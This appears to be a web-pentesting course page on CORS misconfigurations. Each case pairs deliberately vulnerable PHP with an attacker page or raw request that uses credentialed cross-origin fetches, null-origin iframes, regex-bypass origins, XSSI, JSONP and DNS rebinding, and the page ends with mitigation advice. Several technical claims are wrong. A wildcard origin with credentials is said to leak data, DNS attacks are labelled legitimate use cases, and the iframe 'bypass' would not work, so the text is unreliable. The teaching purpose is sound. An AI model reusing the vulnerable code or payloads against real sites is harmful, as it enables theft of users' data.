# Cross-Origin Resource Sharing (CORS)

## What you will learn in this course üßêüßê

- Understand the concept of Cross-Origin Resource Sharing (CORS) and its importance in web security
- Explore common misconfigurations in CORS headers and their associated risks

CORS (Cross-Origin Resource Sharing) is a security mechanism used by web browsers to control resource requests made from a different origin than that of the server. This mechanism allows servers to specify which origins (domains) are permitted to access their resources, thereby preventing unauthorized and potentially malicious requests.

In a legitimate context, CORS is essential for protecting users against attacks such as Cross-Site Request Forgery (CSRF). By default, browsers enforce a same-origin policy, which restricts HTTP requests, such as AJAX requests, to resources originating from the same domain, protocol, and port as the original page. However, some web applications need to share resources across different domains (for example, a public API accessible from multiple sites). This is where CORS comes into play, providing a secure way to allow these interactions while maintaining strict control.

When a server receives a CORS request, it responds with specific headers (like `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, and `Access-Control-Allow-Headers`) that indicate to the browser whether the request is allowed or not. If the headers meet the security criteria defined by the server, the browser will allow the request. If not, it will block it, thereby protecting users from insecure interactions between distinct domains.

## How CORS Works:

### Important Words to Understand

- **Origin**: An origin is a combination of protocol (http, https), domain (example.com), and port (optional, defaulting to 80 for http and 443 for https). For example, `https://example.com:443`.

- **Same-Origin Policy**: Browsers, by default, enforce the Same-Origin Policy, which prevents a web page from making requests to a different origin than the one from which it was served. This is to prevent malicious scripts from stealing or manipulating data across different websites.

- **Cross-Origin Requests**: CORS is a mechanism that relaxes the Same-Origin Policy under controlled conditions. It allows servers to specify who can access their resources, beyond the restrictions of the Same-Origin Policy.

- **HTTP Headers**: CORS works through HTTP headers exchanged between the client (browser) and the server:

- **Origin Header**: When a web page makes a cross-origin request (e.g., from `https://client.com` to `https://api.server.com`), the browser includes an `Origin` header in the request, indicating the origin of the requesting script.

- **Access-Control-Allow-Origin Header**: The server responds with an `Access-Control-Allow-Origin` header. This header specifies which origins are allowed to access the resources on the server. For example, `Access-Control-Allow-Origin: https://client.com` allows requests from `https://client.com`.

- **Other Headers**: Besides `Access-Control-Allow-Origin`, the server may also send other headers like `Access-Control-Allow-Methods` (specifying allowed HTTP methods like GET, POST, etc.), `Access-Control-Allow-Headers` (listing allowed headers in a request), and `Access-Control-Allow-Credentials` (indicating whether credentials like cookies or HTTP authentication are allowed).

- **Preflight Requests**: For certain requests (e.g., those with custom headers or methods other than GET, POST, or HEAD), the browser sends a preflight request (`OPTIONS` request) to the server to determine whether the actual request is safe to send. The server responds to this preflight request with appropriate CORS headers, and if approved, the actual request is then made.

### Exploitation

An attacker exploits a CORS vulnerability by tricking a user's browser into making a request to the vulnerable application from a malicious website. This occurs when the application's CORS policy is too permissive, such as allowing all origins (`*`) or including a malicious origin in the allowed list. By exploiting this vulnerability, an attacker can bypass the same-origin policy, access sensitive data, and perform actions on behalf of the user without their consent.

- **Client-Side JavaScript Application**: A web page hosted on `https://client.com` makes an XMLHttpRequest (XHR) or fetch API request to `https://api.server.com`.

- **CORS Check**: The browser checks if `https://api.server.com` allows requests from `https://client.com` by inspecting the `Access-Control-Allow-Origin` header in the server's response.

- **Access Granted**: If `https://api.server.com` allows requests from `https://client.com` (`Access-Control-Allow-Origin: https://client.com`), the browser allows the request to proceed. Otherwise, it blocks the request and throws a CORS error.

Here is also another exemple:
![CORS](https://cyber-lead-assets.s3.amazonaws.com/M01-Security_Evaluation_and_Testing_(Red)/D04-Web_Pentesting_01/01-lectures/CORS.jpg)

Let's dive into each of the scenarios you provided, explaining the associated vulnerabilities, the risks they pose, and the code examples that demonstrate how these issues can be exploited.

## CORS Pentest

### Misconfigurations in CORS Headers

#### 1. Wildcard `*` in `Access-Control-Allow-Origin`

**Legitimate Use Case:**
Setting `Access-Control-Allow-Origin` to `*` allows any domain to access your resources. This is often used for APIs meant to be publicly accessible.

**Vulnerable Code Example:**

```php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Process authenticated request
    echo "Sensitive Data";
}
```

**Attack Example:**

1. **Malicious Website (Attacker's Site):**

```html
<!DOCTYPE html>
<html>
<body>
	<script>
		fetch('https://vulnerable-website.com/endpoint', {
			method: 'POST',
			credentials: 'include',
			headers: {
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({ "data": "attack" })
		}).then(response => response.text())
		  .then(data => console.log(data));
	</script>
</body>
</html>
```

2. **Request Sent by Attacker's Site:**

    ```
    POST /endpoint HTTP/1.1
    Host: vulnerable-website.com
    Origin: http://attacker-website.com
    Content-Type: application/json
    Cookie: session_id=attacker_session_id
    ```

The server will respond with sensitive data since `Access-Control-Allow-Origin` is `*` and `Access-Control-Allow-Credentials` is `true`.

#### 2. Reflection of `Origin` Header

**Legitimate Use Case:**
Reflecting the `Origin` header allows dynamic responses based on the origin of the request.

**Vulnerable Code Example:**

```php
$origin = $_SERVER['HTTP_ORIGIN'];
header("Access-Control-Allow-Origin: $origin");
header("Access-Control-Allow-Credentials: true");

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo "Sensitive Information";
}
```

**Attack Example:**

1. **Malicious Request:**

```
GET /endpoint HTTP/1.1
Host: vulnerable-website.com
Origin: http://malicious-website.com
```

2. **Server Response:**

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://malicious-website.com
Access-Control-Allow-Credentials: true
Content-Type: text/plain

Sensitive Information
```

The attacker can use their site to make cross-origin requests and retrieve sensitive data from the server.

#### 3. `null` Origin

**Legitimate Use Case:**
The `null` origin can be useful for local file access or sandboxed iframes where the origin is `null`.

**Vulnerable Code Example:**

```php
header("Access-Control-Allow-Origin: null");
header("Access-Control-Allow-Credentials: true");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    echo "Sensitive Data";
}
```

**Attack Example:**

1. **Malicious HTML File (Attacker's Local File):**

```html
<!DOCTYPE html>
<html>
<body>
	<iframe src="https://vulnerable-website.com/endpoint" style="display:none;"></iframe>
</body>
</html>
```

2. **Request Sent by Attacker's File:**

```
POST /endpoint HTTP/1.1
Host: vulnerable-website.com
Origin: null
```

The server will respond with sensitive data because it allows the `null` origin.

### Credential Handling

When handling credentials in web applications, it is crucial to understand how security headers like `Access-Control-Allow-Credentials` are used. These headers are designed to control whether credentials such as cookies or HTTP authentication can be included with cross-origin requests. While there are legitimate scenarios for using this, improper implementation can expose sensitive user data to malicious actors.

#### 1. `Access-Control-Allow-Credentials: true`

**Legitimate Use Case:**
Allows credentials like cookies or HTTP authentication to be sent with cross-origin requests.

**Vulnerable Code Example:**

```php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    echo "User Data";
}
```

**Attack Example:**

1. **Malicious Website (Attacker's Site):**

```html
<!DOCTYPE html>
<html>
<body>
	<script>
		fetch('https://vulnerable-website.com/user-data', {
			method: 'GET',
			credentials: 'include'
		}).then(response => response.text())
		  .then(data => console.log(data));
	</script>
</body>
</html>
```

2. **Request Sent by Attacker's Site:**

```
GET /user-data HTTP/1.1
Host: vulnerable-website.com
Origin: http://attacker-website.com
Cookie: session_id=victim_session_id
```

The server will respond with user data since it accepts credentials from any origin.

### Exploiting Network Location as Authentication

In some cases, applications rely on the network location of a user to grant or restrict access. This approach is common in intranet environments where access is assumed to be safe if it originates from within the network. However, this method of authentication can be exploited if not properly secured, allowing attackers to impersonate trusted network locations.

#### 1. Using Victim's Network Location

**Legitimate Use Case:**
Relying on network location for authentication might be used in intranet applications.

**Vulnerable Code Example:**

```php
header("Access-Control-Allow-Origin: https://trusted-domain.com");
header("Access-Control-Allow-Credentials: true");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    echo "Intranet Data";
}
```

**Attack Example:**

1. **Malicious HTML File (Attacker's Local File):**

```html
<!DOCTYPE html>
<html>
<body>
	<script>
		fetch('https://trusted-domain.com/intranet-data', {
			method: 'POST',
			credentials: 'include'
		}).then(response => response.text())
		  .then(data => console.log(data));
	</script>
</body>
</html>
```

2. **Request Sent by Attacker's File:**

```
POST /intranet-data HTTP/1.1
Host: trusted-domain.com
Origin: http://attacker-website.com
Cookie: session_id=victim_session_id
```

The server will respond with intranet data using the victim's session.

### Regular Expression Bypass Techniques

Regular expressions are a powerful tool for validating input and enforcing security policies like domain whitelisting in CORS configurations. However, improperly crafted regular expressions can be bypassed by attackers, allowing unauthorized domains to be accepted as legitimate. This can lead to serious security vulnerabilities in web applications.

#### 1. Domain Whitelist Bypass

**Legitimate Use Case:**
Regular expressions validate allowed domains to enforce CORS restrictions.

**Vulnerable Code Example:**

```php
$allowed_origins = ['example.com', 'trusted.com'];
$origin = $_SERVER['HTTP_ORIGIN'];

if (preg_match('/^https?:\/\/(.*\.)?(' . implode('|', $allowed_origins) . ')$/i', $origin)) {
    header("Access-Control-Allow-Origin: $origin");
    header("Access-Control-Allow-Credentials: true");
}
```

**Attack Example:**

1. **Malicious Request:**

```
GET /endpoint HTTP/1.1
Host: vulnerable-website.com
Origin: http://nottrusted.com.trusted.com
```

2. **Server Response:**

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://nottrusted.com.trusted.com
Access-Control-Allow-Credentials: true
```

The server incorrectly allows a domain that should be blocked.

### Advanced Techniques

#### 1. XSSI (Cross-Site Script Inclusion)

**Legitimate Use Case:**
Scripts can be included from other domains, but they should be carefully controlled.

**Vulnerable Code Example:**

```php
header("Content-Type: application/javascript");

echo "var secret = 'Sensitive Data';";
```

**Attack Example:**

1. **Malicious Website (Attacker's Site):**

```html
<!DOCTYPE html>
<html>
<body>
	<script src="https://vulnerable-website.com/script.js"></script>
</body>
</html>
```

2. **Request Sent by Attacker's Site:**

```
GET /script.js HTTP/1.1
Host: vulnerable-website.com
```

The `secret` variable is exposed in the script loaded on the attacker's site.

#### 2. JSONP (JSON with Padding)

**Legitimate Use Case:**
JSONP allows cross-domain requests by returning data wrapped in a JavaScript function.

**Vulnerable Code Example:**

```php
$callback = $_GET['callback'];
$data = ['user' => 'Sensitive User Data'];

header('Content-Type: application/javascript');
echo $callback . '(' . json_encode($data) . ');';
```

**Attack Example:**

1. **Malicious Request:**

```
GET /endpoint?callback=maliciousFunction HTTP/1.1
Host: vulnerable-website.com
```

2. **Response Sent by Server:**

```
HTTP/1.1 200 OK
Content-Type: application/javascript

maliciousFunction({"user":"Sensitive User Data"});
```

The attacker can execute the callback function and access sensitive user data.

### DNS Rebinding

#### 1. DNS Rebinding via TTL

**Legitimate Use Case:**
DNS rebinding manipulates IP address resolutions over time to bypass security policies.

**Attack Example:**

1. **Initial DNS Resolution:**

Configure DNS to resolve `attacker-website.com` to an attacker-controlled IP.

2. **Subsequent DNS Resolution:**

After a short TTL, change DNS to resolve

`attacker-website.com` to an internal IP, allowing cross-origin requests to internal services.

#### 2. DNS Cache Flooding

**Legitimate Use Case:**
Flooding DNS cache with false records can lead to incorrect IP resolutions.

**Attack Example:**

1. **Flood DNS Cache:**

Continuously make DNS requests for various subdomains of the target domain to fill the cache.

2. **Exploiting Cache:**

Force a resolution to an attacker-controlled IP by exhausting the DNS cache.

#### 3. Multiple IP Addresses

**Legitimate Use Case:**
Domains resolving to multiple IP addresses can be used to balance load.

**Attack Example:**

1. **Configure Multiple IPs:**

Set up `attacker-website.com` to resolve to multiple IPs, including an internal IP.

2. **Request Using Internal IP:**

The browser may resolve to the internal IP, allowing unauthorized access.

### Iframe and Popup Bypass

**Legitimate Use Case:**
Using iframes or popups to embed or interact with content across domains.

**Vulnerable Code Example:**

```html
<iframe src="https://vulnerable-domain.com/secure-data" id="attackFrame"></iframe>
<script>
    var frame = document.getElementById('attackFrame');
    frame.onload = function() {
        console.log(frame.contentWindow.location.origin);
    };
</script>
```

**Attack Example:**

1. **Malicious HTML File (Attacker's Site):**

```html
<!DOCTYPE html>
<html>
<body>
	<iframe src="https://vulnerable-website.com/secure-data" style="display:none;"></iframe>
	<script>
		var frame = document.querySelector('iframe');
		frame.onload = function() {
			fetch(frame.src)
				.then(response => response.text())
				.then(data => console.log(data));
		};
	</script>
</body>
</html>
```

2. **Request Sent by Attacker's Site:**

```
GET /secure-data HTTP/1.1
Host: vulnerable-website.com
```

### Mitigation Techniques

To effectively mitigate CORS vulnerabilities, it is crucial to adopt a defensive strategy that emphasizes careful configuration and validation. Start by specifying a whitelist of trusted origins in the `Access-Control-Allow-Origin` header instead of using a wildcard (`*`). This limits access to only those domains that are explicitly authorized. Limiting the HTTP methods in the `Access-Control-Allow-Methods` header to only those essential for the application further reduces the attack surface, as does constraining the `Access-Control-Allow-Headers` to only necessary headers.

When using `Access-Control-Allow-Credentials`, it should only be enabled when absolutely necessary, and in such cases, the `Access-Control-Allow-Origin` must be set to a specific, trusted domain rather than a wildcard. To bolster security, the `Origin` header should always be validated on the server side to ensure it matches a trusted source before processing any requests. Implementing strong authentication and authorization checks server-side ensures that even if a request passes CORS validation, it will still undergo rigorous security checks before any sensitive actions are performed. Additionally, enforcing robust Content Security Policies (CSP) helps mitigate the risk of XSS attacks and strengthens the overall security posture of the application.

### Detection Techniques

Detecting CORS vulnerabilities requires a combination of proactive and reactive strategies. Regularly reviewing the application's CORS configuration is vital to ensure it remains appropriately restrictive and up-to-date with current security standards. Conducting periodic penetration testing simulates real-world attack scenarios, helping to uncover any weaknesses or misconfigurations. Monitoring and logging are also essential‚Äîdetailed logs of CORS-related requests, particularly `OPTIONS` preflight requests, should be analyzed for any anomalies or unauthorized access attempts. Automated security tools designed to scan for CORS misconfigurations can provide quick feedback and alerts, making it easier to identify and address potential vulnerabilities.

Finally, complementing the CORS configuration with additional security headers, such as `X-Content-Type-Options`, `X-Frame-Options`, and `Strict-Transport-Security`, can provide further layers of defense against common web vulnerabilities. Engaging in continuous security assessments, including regular code reviews and automated tests, ensures that the application's security measures evolve in line with emerging threats. Through these combined efforts, the risk of CORS-related vulnerabilities can be significantly reduced, keeping web applications secure from unauthorized cross-origin access.

## Resources

- [OWASP CORS](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
- [Mozilla Developer Network on CORS](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
